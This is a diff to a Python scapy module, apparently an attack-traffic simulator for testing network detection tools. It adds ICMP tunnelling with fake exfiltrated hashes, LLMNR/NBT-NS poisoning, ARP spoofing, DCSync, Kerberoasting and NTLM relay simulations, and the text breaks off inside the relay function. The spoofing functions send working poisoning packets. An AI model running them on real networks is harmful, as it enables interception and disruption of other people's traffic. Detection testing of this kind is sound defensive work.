@@ -12,7 +12,7 @@ import string
 import hashlib
 import struct
 from scapy.all import (
-    Ether, IP, TCP, UDP, ICMP, Raw, DNS, DNSQR,
+    Ether, ARP, IP, TCP, UDP, ICMP, Raw, DNS, DNSQR,
     sendp, get_if_hwaddr, RandShort
 )
 from app.core.engine import active_task_status, log_message
@@ -28,6 +28,12 @@ def generate(params):
         'lateral_movement': _sim_lateral_movement,
         'http_exfil': _sim_http_exfil,
         'dga': _sim_dga,
+        'icmp_tunnel': _sim_icmp_tunnel,
+        'llmnr_poison': _sim_llmnr_poison,
+        'arp_spoof': _sim_arp_spoof,
+        'dcsync': _sim_dcsync,
+        'kerberoast': _sim_kerberoast,
+        'ntlm_relay': _sim_ntlm_relay,
     }
 
     sim_func = simulations.get(sim)
@@ -647,3 +653,846 @@ def _sim_dga(params):
         log_message(f"    DGA query: {dga_domain}")
 
     _send_with_tracking(packets, params, delay_override=0.1)
+
+
+# ── ICMP Tunneling ──────────────────────────────────────────────────────────
+
+def _sim_icmp_tunnel(params):
+    """
+    ICMP tunneling: data exfiltration hidden inside ICMP echo request payloads.
+    Normal ICMP echo payloads are 32-56 bytes. This sends oversized payloads
+    (200-500+ bytes) with encoded data, triggering NDR anomalous ICMP detections.
+    Vectra, Darktrace, and ExtraHop all flag abnormal ICMP payload sizes.
+    """
+    count = params.get('count', 40)
+    src_ip = params['src_ip']
+    dst_ip = params['dst_ip']
+    base = _base_packet(params)
+
+    log_message(f"    Tunnel endpoint: {dst_ip}")
+    log_message(f"    Exfil packets: {count}")
+
+    # Fake sensitive data to encode into ICMP payloads
+    exfil_data = (
+        "BEGIN_EXFIL:user=administrator;ntlm_hash=aad3b435b51404eeaad3b435b51404ee:"
+        "e19ccf75ee54e06b06a5907af13cef42;domain=CORP.LOCAL;dc=DC01;"
+        "krbtgt_hash=f3bc61e97fb14d18c42f9f3b1a8e3a0d;trust_key=9a8b7c6d5e4f3a2b;"
+        "backup_key=MIIJQgIBADANBgkqhkiG9w0BAQEFAASC:END_EXFIL"
+    )
+    chunks = [exfil_data[i:i+60] for i in range(0, len(exfil_data), 60)]
+
+    packets = []
+    seq_num = 1
+    for i in range(count):
+        chunk = chunks[i % len(chunks)]
+        # Encode the chunk and pad to create oversized payload (200-500 bytes)
+        encoded = chunk.encode().hex().encode()
+        padding = os.urandom(random.randint(100, 300))
+        payload = encoded + b'\x00' + padding
+
+        pkt = (base / IP(src=src_ip, dst=dst_ip) /
+               ICMP(type=8, code=0, id=0x1337, seq=seq_num) /
+               Raw(load=payload))
+        packets.append(pkt)
+
+        # Simulated echo reply with response data (bidirectional tunnel)
+        reply_payload = os.urandom(random.randint(150, 400))
+        reply_pkt = (base / IP(src=dst_ip, dst=src_ip) /
+                     ICMP(type=0, code=0, id=0x1337, seq=seq_num) /
+                     Raw(load=reply_payload))
+        packets.append(reply_pkt)
+
+        seq_num += 1
+
+    log_message(f"    Avg payload size: ~{sum(len(p[Raw].load) for p in packets) // len(packets)} bytes (normal: 32-56)")
+    _send_with_tracking(packets, params, delay_override=0.15)
+
+
+# ── LLMNR / NBT-NS Poisoning ───────────────────────────────────────────────
+
+def _sim_llmnr_poison(params):
+    """
+    LLMNR/NBT-NS poisoning (T1557.001): simulates Responder-style attacks.
+    Sends spoofed LLMNR responses on multicast 224.0.0.252:5355 and
+    NBT-NS responses on broadcast UDP 137 claiming to be requested hosts.
+    NDR tools detect unsolicited name resolution responses from unexpected sources.
+    """
+    count = params.get('count', 30)
+    src_ip = params['src_ip']
+    base = _base_packet(params)
+
+    log_message(f"    Poisoner IP: {src_ip}")
+    log_message(f"    Poisoning LLMNR (224.0.0.252:5355) + NBT-NS (broadcast:137)")
+
+    # Common hostnames that get queried via LLMNR/NBT-NS
+    target_names = [
+        'WPAD', 'FILESERVER', 'SHAREPOINT', 'EXCHANGE', 'PRINTER',
+        'SQL01', 'BACKUP', 'INTRANET', 'PROXY', 'DC01', 'WEBMAIL',
+        'APP01', 'CITRIX', 'VPN', 'NAS01'
+    ]
+
+    packets = []
+    for i in range(count):
+        hostname = target_names[i % len(target_names)]
+
+        # ── LLMNR Response (UDP 5355 to multicast 224.0.0.252) ──
+        # LLMNR uses DNS-like format with transaction ID, flags, and RRs
+        txn_id = random.randint(0x1000, 0xFFFF)
+        name_encoded = b''
+        for label in hostname.split('.'):
+            name_encoded += struct.pack('!B', len(label)) + label.encode()
+        name_encoded += b'\x00'
+
+        # LLMNR response: flags=0x8000 (response), 1 question, 1 answer
+        llmnr_resp = struct.pack('!HHHHHH', txn_id, 0x8000, 1, 1, 0, 0)
+        # Question section
+        llmnr_resp += name_encoded + struct.pack('!HH', 1, 1)  # Type A, Class IN
+        # Answer section: pointer to name + A record with our IP
+        llmnr_resp += name_encoded + struct.pack('!HH', 1, 1)  # Type A, Class IN
+        llmnr_resp += struct.pack('!I', 30)  # TTL 30s
+        llmnr_resp += struct.pack('!H', 4)   # Data length
+        llmnr_resp += bytes(int(o) for o in src_ip.split('.'))  # Our IP as answer
+
+        pkt_llmnr = (base / IP(src=src_ip, dst='224.0.0.252') /
+                     UDP(sport=5355, dport=5355) /
+                     Raw(load=llmnr_resp))
+        packets.append(pkt_llmnr)
+
+        # ── NBT-NS Response (UDP 137 broadcast) ──
+        # NetBIOS name: 16 chars padded with spaces, then "half-ASCII" encoded
+        nb_name = hostname.ljust(15) + '\x00'  # 15 chars + null suffix (workstation)
+        encoded_name = b''
+        for ch in nb_name.encode():
+            encoded_name += bytes([0x41 + (ch >> 4), 0x41 + (ch & 0x0F)])
+
+        nbt_txn = random.randint(0x1000, 0xFFFF)
+        nbt_resp = struct.pack('!HHHHHH', nbt_txn, 0x8500, 0, 1, 0, 0)  # Positive response
+        # Name: length-prefixed encoded name + scope (null)
+        nbt_resp += struct.pack('!B', 32) + encoded_name + b'\x00'
+        nbt_resp += struct.pack('!HH', 0x0020, 0x0001)  # NB type, IN class
+        nbt_resp += struct.pack('!I', 30)  # TTL
+        nbt_resp += struct.pack('!H', 6)   # Data length (flags + IP)
+        nbt_resp += struct.pack('!H', 0)   # NB flags (B-node, unique)
+        nbt_resp += bytes(int(o) for o in src_ip.split('.'))
+
+        dst_ip = params.get('dst_ip', '255.255.255.255')
+        pkt_nbt = (base / IP(src=src_ip, dst=dst_ip) /
+                   UDP(sport=137, dport=137) /
+                   Raw(load=nbt_resp))
+        packets.append(pkt_nbt)
+
+        log_message(f"    Poisoning: {hostname} -> {src_ip}")
+
+    _send_with_tracking(packets, params, delay_override=0.3)
+
+
+# ── ARP Spoofing ────────────────────────────────────────────────────────────
+
+def _sim_arp_spoof(params):
+    """
+    ARP spoofing/cache poisoning (T1557): sends gratuitous ARP replies
+    claiming another host's IP belongs to our MAC. Classic MitM setup.
+    NDR tools detect duplicate IP-to-MAC mappings and ARP anomalies.
+    """
+    count = params.get('count', 30)
+    src_ip = params['src_ip']
+    dst_ip = params['dst_ip']
+    iface = params['interface']
+    src_mac = params.get('src_mac') or get_if_hwaddr(iface)
+
+    log_message(f"    Attacker MAC: {src_mac}")
+    log_message(f"    Spoofing: {dst_ip} is-at {src_mac}")
+    log_message(f"    Target (victim): {src_ip}")
+
+    # Derive gateway (common .1) if dst_ip looks like a gateway
+    octets = dst_ip.split('.')
+    subnet_prefix = '.'.join(octets[:3])
+
+    packets = []
+    for i in range(count):
+        # Gratuitous ARP reply: "dst_ip is at our MAC" -> sent to victim
+        # This poisons the victim's ARP cache for the gateway
+        pkt_gw = (Ether(src=src_mac, dst='ff:ff:ff:ff:ff:ff') /
+                  ARP(op=2,  # ARP reply
+                      hwsrc=src_mac,
+                      psrc=dst_ip,       # Claim to be the gateway/target
+                      hwdst='ff:ff:ff:ff:ff:ff',
+                      pdst=src_ip))      # Tell the victim
+        packets.append(pkt_gw)
+
+        # Also spoof the reverse direction: "victim IP is at our MAC" -> sent to gateway
+        pkt_victim = (Ether(src=src_mac, dst='ff:ff:ff:ff:ff:ff') /
+                      ARP(op=2,
+                          hwsrc=src_mac,
+                          psrc=src_ip,       # Claim to be the victim
+                          hwdst='ff:ff:ff:ff:ff:ff',
+                          pdst=dst_ip))      # Tell the gateway
+        packets.append(pkt_victim)
+
+        # Throw in some ARP requests too (reconnaissance pattern)
+        if i % 5 == 0:
+            target_host = f"{subnet_prefix}.{random.randint(1, 254)}"
+            pkt_scan = (Ether(src=src_mac, dst='ff:ff:ff:ff:ff:ff') /
+                        ARP(op=1,  # ARP request
+                            hwsrc=src_mac,
+                            psrc=src_ip,
+                            hwdst='00:00:00:00:00:00',
+                            pdst=target_host))
+            packets.append(pkt_scan)
+
+    log_message(f"    Total ARP packets: {len(packets)}")
+    _send_with_tracking(packets, params, delay_override=0.5)
+
+
+# ── DCSync Attack ───────────────────────────────────────────────────────────
+
+def _sim_dcsync(params):
+    """
+    DCSync attack (T1003.006): simulates Active Directory replication
+    requests (DsGetNCChanges) over MS-DRSR/RPC.
+    A non-DC host initiating directory replication is a high-fidelity
+    indicator detected by all major NDR/EDR tools.
+    Full TCP sessions with RPC bind to DRSUAPI UUID.
+    """
+    src_ip = params['src_ip']
+    dst_ip = params['dst_ip']  # Domain controller IP
+    base = _base_packet(params)
+    count = params.get('count', 5)
+
+    log_message(f"    Attacker: {src_ip}")
+    log_message(f"    Domain Controller: {dst_ip}")
+    log_message(f"    Simulating {count} replication requests")
+
+    # DRSUAPI interface UUID: e3514235-4b06-11d1-ab04-00c04fc2dcd2
+    drsuapi_uuid = (
+        b'\x35\x42\x51\xe3\x06\x4b\xd1\x11'
+        b'\xab\x04\x00\xc0\x4f\xc2\xdc\xd2'
+    )
+    drsuapi_version = struct.pack('<H', 4) + struct.pack('<H', 0)
+
+    # Naming contexts to replicate (what a real DCSync requests)
+    naming_contexts = [
+        'DC=corp,DC=local',
+        'CN=Configuration,DC=corp,DC=local',
+        'CN=Schema,CN=Configuration,DC=corp,DC=local',
+    ]
+
+    packets = []
+    for i in range(count):
+        sport = random.randint(49152, 65535)
+
+        # ── Phase 1: RPC Endpoint Mapper (port 135) ──
+        hs_pkts, client_seq, server_seq = _tcp_handshake(
+            base, src_ip, dst_ip, sport, 135
+        )
+        packets.extend(hs_pkts)
+
+        # RPC Bind to ISystemActivator on EPM
+        # DCE/RPC bind header
+        rpc_bind = bytearray()
+        rpc_bind += b'\x05'           # version major
+        rpc_bind += b'\x00'           # version minor
+        rpc_bind += b'\x0b'           # bind
+        rpc_bind += b'\x03'           # PFC first+last frag
+        rpc_bind += b'\x10\x00\x00\x00'  # data representation (little-endian)
+        rpc_bind += struct.pack('<H', 72)  # frag length
+        rpc_bind += struct.pack('<H', 0)   # auth length
+        rpc_bind += struct.pack('<I', i)   # call ID
+        # Bind body
+        rpc_bind += struct.pack('<H', 5840)  # max xmit frag
+        rpc_bind += struct.pack('<H', 5840)  # max recv frag
+        rpc_bind += struct.pack('<I', 0)     # assoc group
+        rpc_bind += struct.pack('<I', 1)     # num context items
+        # Context item: DRSUAPI
+        rpc_bind += struct.pack('<H', 0)     # context ID
+        rpc_bind += struct.pack('<H', 1)     # num trans items
+        rpc_bind += drsuapi_uuid             # abstract syntax UUID
+        rpc_bind += drsuapi_version          # interface version
+        # Transfer syntax: NDR UUID 8a885d04-1ceb-11c9-9fe8-08002b104860
+        rpc_bind += (
+            b'\x04\x5d\x88\x8a\xeb\x1c\xc9\x11'
+            b'\x9f\xe8\x08\x00\x2b\x10\x48\x60'
+        )
+        rpc_bind += struct.pack('<H', 2) + struct.pack('<H', 0)  # NDR version 2.0
+
+        packets.append(
+            base / IP(src=src_ip, dst=dst_ip) /
+            TCP(sport=sport, dport=135, flags='PA',
+                seq=client_seq, ack=server_seq) /
+            Raw(load=bytes(rpc_bind))
+        )
+        client_seq += len(rpc_bind)
+
+        # Server bind ACK
+        rpc_bind_ack = bytearray()
+        rpc_bind_ack += b'\x05\x00\x0c\x03'  # version, bind_ack, flags
+        rpc_bind_ack += b'\x10\x00\x00\x00'   # data representation
+        rpc_bind_ack += struct.pack('<H', 68)  # frag length
+        rpc_bind_ack += struct.pack('<H', 0)   # auth length
+        rpc_bind_ack += struct.pack('<I', i)   # call ID
+        rpc_bind_ack += struct.pack('<H', 5840)  # max xmit
+        rpc_bind_ack += struct.pack('<H', 5840)  # max recv
+        rpc_bind_ack += struct.pack('<I', 0x12345)  # assoc group
+        rpc_bind_ack += struct.pack('<H', 4)   # secondary addr len
+        rpc_bind_ack += b'135\x00'             # secondary addr
+        rpc_bind_ack += b'\x00\x00'            # padding
+        rpc_bind_ack += struct.pack('<I', 1)   # num results
+        rpc_bind_ack += struct.pack('<H', 0)   # acceptance
+        rpc_bind_ack += struct.pack('<H', 0)   # reason
+        # Transfer syntax
+        rpc_bind_ack += (
+            b'\x04\x5d\x88\x8a\xeb\x1c\xc9\x11'
+            b'\x9f\xe8\x08\x00\x2b\x10\x48\x60'
+        )
+        rpc_bind_ack += struct.pack('<H', 2) + struct.pack('<H', 0)
+
+        packets.append(
+            base / IP(src=dst_ip, dst=src_ip) /
+            TCP(sport=135, dport=sport, flags='PA',
+                seq=server_seq, ack=client_seq) /
+            Raw(load=bytes(rpc_bind_ack))
+        )
+        server_seq += len(rpc_bind_ack)
+
+        # FIN the EPM connection
+        fin_pkts = _tcp_fin(base, src_ip, dst_ip, sport, 135,
+                            client_seq, server_seq)
+        packets.extend(fin_pkts)
+
+        # ── Phase 2: DRSUAPI on high port (simulate assigned port) ──
+        drsr_port = random.randint(49152, 49200)
+        sport2 = random.randint(49152, 65535)
+
+        hs2_pkts, cseq2, sseq2 = _tcp_handshake(
+            base, src_ip, dst_ip, sport2, drsr_port
+        )
+        packets.extend(hs2_pkts)
+
+        # RPC Bind to DRSUAPI on the assigned port
+        packets.append(
+            base / IP(src=src_ip, dst=dst_ip) /
+            TCP(sport=sport2, dport=drsr_port, flags='PA',
+                seq=cseq2, ack=sseq2) /
+            Raw(load=bytes(rpc_bind))  # Same bind payload
+        )
+        cseq2 += len(rpc_bind)
+
+        # Server bind ACK
+        packets.append(
+            base / IP(src=dst_ip, dst=src_ip) /
+            TCP(sport=drsr_port, dport=sport2, flags='PA',
+                seq=sseq2, ack=cseq2) /
+            Raw(load=bytes(rpc_bind_ack))
+        )
+        sseq2 += len(rpc_bind_ack)
+
+        # DsGetNCChanges request (RPC Request, opnum 3)
+        nc = naming_contexts[i % len(naming_contexts)]
+        nc_bytes = nc.encode('utf-16-le')
+
+        rpc_request = bytearray()
+        rpc_request += b'\x05\x00\x00\x03'  # version, request, flags
+        rpc_request += b'\x10\x00\x00\x00'  # data representation
+        stub_data = nc_bytes + b'\x00\x00' + os.urandom(64)  # Simplified stub
+        total_len = 24 + len(stub_data)
+        rpc_request += struct.pack('<H', total_len)  # frag length
+        rpc_request += struct.pack('<H', 0)   # auth length
+        rpc_request += struct.pack('<I', i + 100)  # call ID
+        rpc_request += struct.pack('<I', len(stub_data))  # alloc hint
+        rpc_request += struct.pack('<H', 0)   # context ID
+        rpc_request += struct.pack('<H', 3)   # opnum 3 = DsGetNCChanges
+        rpc_request += stub_data
+
+        packets.append(
+            base / IP(src=src_ip, dst=dst_ip) /
+            TCP(sport=sport2, dport=drsr_port, flags='PA',
+                seq=cseq2, ack=sseq2) /
+            Raw(load=bytes(rpc_request))
+        )
+        cseq2 += len(rpc_request)
+
+        # Server large response (replication data)
+        rpc_response = bytearray()
+        rpc_response += b'\x05\x00\x02\x03'  # version, response, flags
+        rpc_response += b'\x10\x00\x00\x00'  # data representation
+        resp_stub = os.urandom(random.randint(500, 2000))  # Large replication response
+        resp_total = 24 + len(resp_stub)
+        rpc_response += struct.pack('<H', resp_total)
+        rpc_response += struct.pack('<H', 0)
+        rpc_response += struct.pack('<I', i + 100)
+        rpc_response += struct.pack('<I', len(resp_stub))
+        rpc_response += struct.pack('<H', 0)   # context ID
+        rpc_response += struct.pack('<H', 0)   # cancel count + reserved
+        rpc_response += resp_stub
+
+        packets.append(
+            base / IP(src=dst_ip, dst=src_ip) /
+            TCP(sport=drsr_port, dport=sport2, flags='PA',
+                seq=sseq2, ack=cseq2) /
+            Raw(load=bytes(rpc_response))
+        )
+        sseq2 += len(rpc_response)
+
+        # Client ACK
+        packets.append(
+            base / IP(src=src_ip, dst=dst_ip) /
+            TCP(sport=sport2, dport=drsr_port, flags='A',
+                seq=cseq2, ack=sseq2)
+        )
+
+        # FIN
+        fin_pkts2 = _tcp_fin(base, src_ip, dst_ip, sport2, drsr_port,
+                              cseq2, sseq2)
+        packets.extend(fin_pkts2)
+
+        log_message(f"    DsGetNCChanges #{i+1}: {nc}")
+
+    _send_with_tracking(packets, params, delay_override=0.3)
+
+
+# ── Kerberoasting ───────────────────────────────────────────────────────────
+
+def _sim_kerberoast(params):
+    """
+    Kerberoasting (T1558.003): burst of TGS-REQ packets requesting
+    service tickets for multiple SPNs. NDR tools detect a single source
+    requesting an unusual volume of TGS tickets in a short window.
+    Sent as full TCP sessions to port 88 (Kerberos KDC).
+    """
+    src_ip = params['src_ip']
+    dst_ip = params['dst_ip']  # KDC / Domain controller
+    base = _base_packet(params)
+    count = params.get('count', 20)
+
+    log_message(f"    Attacker: {src_ip}")
+    log_message(f"    KDC: {dst_ip}")
+
+    # Target SPNs (common service accounts to kerberoast)
+    target_spns = [
+        'MSSQLSvc/sql01.corp.local:1433',
+        'MSSQLSvc/sql02.corp.local:1433',
+        'HTTP/webserver.corp.local',
+        'HTTP/sharepoint.corp.local',
+        'CIFS/fileserver.corp.local',
+        'exchangeMDB/exchange01.corp.local',
+        'IMAP/mail.corp.local',
+        'SIP/lync.corp.local',
+        'FTP/ftp01.corp.local',
+        'WSMAN/mgmt01.corp.local',
+        'TERMSRV/rdp01.corp.local',
+        'MSSQLSvc/analytics.corp.local:1433',
+        'HTTP/jenkins.corp.local',
+        'HTTP/gitlab.corp.local',
+        'LDAP/dc02.corp.local',
+        'DNS/dc01.corp.local',
+        'kafka/broker01.corp.local',
+        'HTTP/grafana.corp.local',
+        'MongoDB/mongo01.corp.local',
+        'HTTP/jira.corp.local',
+    ]
+
+    packets = []
+    for i in range(min(count, len(target_spns))):
+        spn = target_spns[i]
+        sport = random.randint(49152, 65535)
+
+        # TCP handshake to KDC port 88
+        hs_pkts, client_seq, server_seq = _tcp_handshake(
+            base, src_ip, dst_ip, sport, 88
+        )
+        packets.extend(hs_pkts)
+
+        # Build a TGS-REQ (Kerberos v5)
+        # ASN.1 structure: APPLICATION 12 (TGS-REQ)
+        realm = b'CORP.LOCAL'
+        sname_parts = spn.split('/')
+        service_class = sname_parts[0].encode()
+        service_host = sname_parts[1].encode() if len(sname_parts) > 1 else b'unknown'
+
+        # Simplified but structurally valid TGS-REQ
+        # This builds enough of the Kerberos structure for NDR to parse
+        tgs_req = bytearray()
+
+        # Inner body of TGS-REQ
+        body = bytearray()
+
+        # KDC-Options [0]: forwardable, renewable, canonicalize
+        body += b'\xa0\x07\x03\x05\x00\x40\x81\x00\x10'
+
+        # Realm [2]
+        realm_der = _asn1_string(realm)
+        body += b'\xa2' + _asn1_len(len(realm_der)) + realm_der
+
+        # SName [3]: sequence of principal name
+        sname_seq = bytearray()
+        # name-type [0]: SRV_INST (2)
+        sname_seq += b'\xa0\x03\x02\x01\x02'
+        # name-string [1]: sequence of strings
+        name_strs = _asn1_string(service_class) + _asn1_string(service_host)
+        name_seq = b'\x30' + _asn1_len(len(name_strs)) + name_strs
+        sname_seq += b'\xa1' + _asn1_len(len(name_seq)) + name_seq
+        sname_outer = b'\x30' + _asn1_len(len(sname_seq)) + sname_seq
+        body += b'\xa3' + _asn1_len(len(sname_outer)) + sname_outer
+
+        # Nonce [7]
+        nonce_val = random.randint(100000000, 999999999)
+        nonce_der = b'\x02\x04' + struct.pack('!I', nonce_val)
+        body += b'\xa7' + _asn1_len(len(nonce_der)) + nonce_der
+
+        # etype [8]: RC4-HMAC (23) - what kerberoasting targets
+        etype_der = b'\x30\x05\x02\x01\x17\x02\x00'
+        body += b'\xa8' + _asn1_len(len(etype_der)) + etype_der
+
+        # Wrap in KDC-REQ-BODY SEQUENCE
+        req_body = b'\x30' + _asn1_len(len(body)) + body
+
+        # Build TGS-REQ outer structure
+        tgs_inner = bytearray()
+        # pvno [1]: 5
+        tgs_inner += b'\xa1\x03\x02\x01\x05'
+        # msg-type [2]: TGS-REQ (12)
+        tgs_inner += b'\xa2\x03\x02\x01\x0c'
+
+        # padata [3]: PA-TGS-REQ with fake TGT (authenticator)
+        fake_tgt = os.urandom(random.randint(200, 400))
+        pa_tgs = b'\x30' + _asn1_len(len(fake_tgt) + 8)
+        pa_tgs += b'\xa1\x03\x02\x01\x01'  # padata-type: PA-TGS-REQ (1)
+        pa_tgs += b'\xa2' + _asn1_len(len(fake_tgt)) + fake_tgt
+        pa_seq = b'\x30' + _asn1_len(len(pa_tgs)) + pa_tgs
+        tgs_inner += b'\xa3' + _asn1_len(len(pa_seq)) + pa_seq
+
+        # req-body [4]
+        tgs_inner += b'\xa4' + _asn1_len(len(req_body)) + req_body
+
+        # Wrap in SEQUENCE
+        tgs_seq = b'\x30' + _asn1_len(len(tgs_inner)) + tgs_inner
+
+        # APPLICATION 12 tag
+        tgs_req = b'\x6c' + _asn1_len(len(tgs_seq)) + tgs_seq
+
+        # Kerberos uses a 4-byte length prefix over TCP
+        krb_tcp = struct.pack('!I', len(tgs_req)) + tgs_req
+
+        packets.append(
+            base / IP(src=src_ip, dst=dst_ip) /
+            TCP(sport=sport, dport=88, flags='PA',
+                seq=client_seq, ack=server_seq) /
+            Raw(load=bytes(krb_tcp))
+        )
+        client_seq += len(krb_tcp)
+
+        # KDC response (TGS-REP with encrypted service ticket)
+        # The large encrypted ticket is what gets cracked offline
+        fake_ticket = os.urandom(random.randint(800, 1500))
+        tgs_rep_inner = bytearray()
+        tgs_rep_inner += b'\xa0\x03\x02\x01\x05'  # pvno
+        tgs_rep_inner += b'\xa1\x03\x02\x01\x0d'  # msg-type: TGS-REP (13)
+        tgs_rep_inner += b'\xa5' + _asn1_len(len(fake_ticket)) + fake_ticket
+        tgs_rep_seq = b'\x30' + _asn1_len(len(tgs_rep_inner)) + tgs_rep_inner
+        tgs_rep = b'\x6d' + _asn1_len(len(tgs_rep_seq)) + tgs_rep_seq
+        krb_tcp_resp = struct.pack('!I', len(tgs_rep)) + tgs_rep
+
+        packets.append(
+            base / IP(src=dst_ip, dst=src_ip) /
+            TCP(sport=88, dport=sport, flags='PA',
+                seq=server_seq, ack=client_seq) /
+            Raw(load=bytes(krb_tcp_resp))
+        )
+        server_seq += len(krb_tcp_resp)
+
+        # Client ACK
+        packets.append(
+            base / IP(src=src_ip, dst=dst_ip) /
+            TCP(sport=sport, dport=88, flags='A',
+                seq=client_seq, ack=server_seq)
+        )
+
+        # FIN
+        fin_pkts = _tcp_fin(base, src_ip, dst_ip, sport, 88,
+                            client_seq, server_seq)
+        packets.extend(fin_pkts)
+
+        log_message(f"    TGS-REQ #{i+1}: {spn}")
+
+    _send_with_tracking(packets, params, delay_override=0.1)
+
+
+def _asn1_len(length):
+    """Encode an ASN.1 length field."""
+    if length < 0x80:
+        return bytes([length])
+    elif length < 0x100:
+        return bytes([0x81, length])
+    else:
+        return bytes([0x82]) + struct.pack('!H', length)
+
+
+def _asn1_string(data):
+    """Encode an ASN.1 GeneralString."""
+    if isinstance(data, str):
+        data = data.encode()
+    return b'\x1b' + _asn1_len(len(data)) + data
+
+
+# ── NTLM Relay ──────────────────────────────────────────────────────────────
+
+def _sim_ntlm_relay(params):
+    """
+    NTLM relay attack (T1557.001): simulates the traffic pattern of
+    intercepting NTLM authentication from one host and relaying it to
+    another (e.g., SMB->SMB relay). NDR tools detect the relay pattern:
+    inbound NTLM auth immediately followed by outbound NTLM auth
+    from the same host with matching challenge/response tokens.
+    """
+    src_ip = params['src_ip']     # Attacker/relay host
+    dst_ip = params['dst_ip']     # Target being relayed to
+    base = _base_packet(params)
+    count = params.get('count', 10)
+
+    # Simulated victim IPs (hosts whose auth is being relayed)
+    octets = src_ip.split('.')
+    subnet = '.'.join(octets[:3])
+    victims = [f"{subnet}.{random.randint(10, 250)}" for _ in range(min(count, 10))]
+
+    log_message(f"    Relay host: {src_ip}")
+    log_message(f"    Relay target: {dst_ip}")
+    log_message(f"    Victim sources: {len(victims)} hosts")
+
+    # NTLM message type constants
+    NTLMSSP_NEGOTIATE = (
+        b'NTLMSSP\x00'
+        b'\x01\x00\x00\x00'   # Type 1 (Negotiate)
+        b'\x97\x82\x08\xe2'   # Flags: NTLM, Unicode, Seal, Sign
+        b'\x00\x00\x00\x00'   # Domain name fields (empty)
+        b'\x00\x00\x00\x00'
+        b'\x00\x00\x00\x00'   # Workstation fields (empty)
+        b'\x00\x00\x00\x00'
+        b'\x0a\x00\x61\x4a'   # Version 10.0
+        b'\x00\x00\x00\x0f'   # Revision
+    )
+
+    packets = []
+    for i, victim_ip in enumerate(victims):
+        sport_victim = random.randint(49152, 65535)
+        sport_relay = random.randint(49152, 65535)
+
+        # ═══ Phase 1: Victim -> Attacker (inbound SMB with NTLM) ═══
+
+        # TCP handshake: victim -> attacker port 445
+        hs1, cseq1, sseq1 = _tcp_handshake(
+            base, victim_ip, src_ip, sport_victim, 445
+        )
+        packets.extend(hs1)
+
+        # SMB2 Negotiate from victim
+        smb_neg = bytearray()
+        smb_neg += b'\x00\x00\x00\x44'     # NetBIOS length
+        smb_neg += b'\xfeSMB'               # SMB2 magic
+        smb_neg += struct.pack('<H', 64)    # header length
+        smb_neg += b'\x00' * 2              # credit charge
+        smb_neg += b'\x00' * 4              # status
+        smb_neg += struct.pack('<H', 0)     # negotiate
+        smb_neg += struct.pack('<H', 1)     # credits
+        smb_neg += b'\x00' * 4              # flags
+        smb_neg += b'\x00' * 4              # next command
+        smb_neg += struct.pack('<Q', 1)     # message ID
+        smb_neg += b'\x00' * 4              # reserved
+        smb_neg += b'\x00' * 4              # tree ID
+        smb_neg += struct.pack('<Q', 0)     # session ID
+        smb_neg += b'\x00' * 16             # signature
+
+        packets.append(
+            base / IP(src=victim_ip, dst=src_ip) /
+            TCP(sport=sport_victim, dport=445, flags='PA',
+                seq=cseq1, ack=sseq1) /
+            Raw(load=bytes(smb_neg))
+        )
+        cseq1 += len(smb_neg)
+
+        # Attacker ACK
+        packets.append(
+            base / IP(src=src_ip, dst=victim_ip) /
+            TCP(sport=445, dport=sport_victim, flags='A',
+                seq=sseq1, ack=cseq1)
+        )
+
+        # SMB2 Session Setup with NTLM Type 1 (Negotiate) from victim
+        ntlm_negotiate = bytearray()
+        ntlm_negotiate += b'\x00\x00'  # NetBIOS length placeholder
+        ntlm_negotiate += b'\xfeSMB'
+        ntlm_negotiate += struct.pack('<H', 64)
+        ntlm_negotiate += b'\x00' * 2
+        ntlm_negotiate += b'\x00' * 4      # status
+        ntlm_negotiate += struct.pack('<H', 1)  # session setup
+        ntlm_negotiate += struct.pack('<H', 1)
+        ntlm_negotiate += b'\x00' * 4
+        ntlm_negotiate += b'\x00' * 4
+        ntlm_negotiate += struct.pack('<Q', 2)  # message ID
+        ntlm_negotiate += b'\x00' * 4
+        ntlm_negotiate += b'\x00' * 4
+        ntlm_negotiate += struct.pack('<Q', 0)  # session ID
+        ntlm_negotiate += b'\x00' * 16
+        # Session setup body
+        ntlm_negotiate += struct.pack('<H', 25)  # struct size
+        ntlm_negotiate += b'\x00'                # flags
+        ntlm_negotiate += b'\x01'                # security mode
+        ntlm_negotiate += struct.pack('<I', 0)   # capabilities
+        ntlm_negotiate += struct.pack('<I', 0)   # channel
+        sec_offset = len(ntlm_negotiate) + 4
+        ntlm_negotiate += struct.pack('<H', sec_offset)  # security buffer offset
+        ntlm_negotiate += struct.pack('<H', len(NTLMSSP_NEGOTIATE))
+        ntlm_negotiate += struct.pack('<Q', 0)   # previous session
+        ntlm_negotiate += NTLMSSP_NEGOTIATE
+        # Fix NetBIOS length
+        nb_len = len(ntlm_negotiate) - 4
+        struct.pack_into('!I', ntlm_negotiate, 0, nb_len)
+
+        packets.append(
+            base / IP(src=victim_ip, dst=src_ip) /
+            TCP(sport=sport_victim, dport=445, flags='PA',
+                seq=cseq1, ack=sseq1) /
+            Raw(load=bytes(ntlm_negotiate))
+        )
+        cseq1 += len(ntlm_negotiate)
+
+        # ═══ Phase 2: Attacker -> Target (outbound relay with same NTLM) ═══
+
+        # TCP handshake: attacker -> target port 445
+        hs2, cseq2, sseq2 = _tcp_handshake(
+            base, src_ip, dst_ip, sport_relay, 445
+        )
+        packets.extend(hs2)
+
+        # Attacker relays the NTLM Negotiate to the real target
+        relay_negotiate = bytearray(ntlm_negotiate)
+        # Change message ID to look like a new session
+        struct.pack_into('<Q', relay_negotiate, 28, 1)
+
+        packets.append(
+            base / IP(src=src_ip, dst=dst_ip) /
+            TCP(sport=sport_relay, dport=445, flags='PA',
+                seq=cseq2, ack=sseq2) /
+            Raw(load=bytes(relay_negotiate))
+        )
+        cseq2 += len(relay_negotiate)
+
+        # Target responds with NTLM Challenge (Type 2)
+        challenge = os.urandom(8)
+        ntlm_challenge = (
+            b'NTLMSSP\x00'
+            b'\x02\x00\x00\x00'       # Type 2 (Challenge)
+            b'\x0c\x00\x0c\x00\x38\x00\x00\x00'  # Target name fields
+            b'\x33\x82\x8a\xe2'        # Flags
+        ) + challenge + b'\x00' * 8 + b'C\x00O\x00R\x00P\x00\x00\x00'
+
+        smb_challenge = bytearray()
+        smb_challenge += b'\x00\x00\x00\x00'  # NetBIOS placeholder
+        smb_challenge += b'\xfeSMB'
+        smb_challenge += struct.pack('<H', 64)
+        smb_challenge += b'\x00' * 2
+        smb_challenge += struct.pack('<I', 0xC0000016)  # STATUS_MORE_PROCESSING_REQUIRED
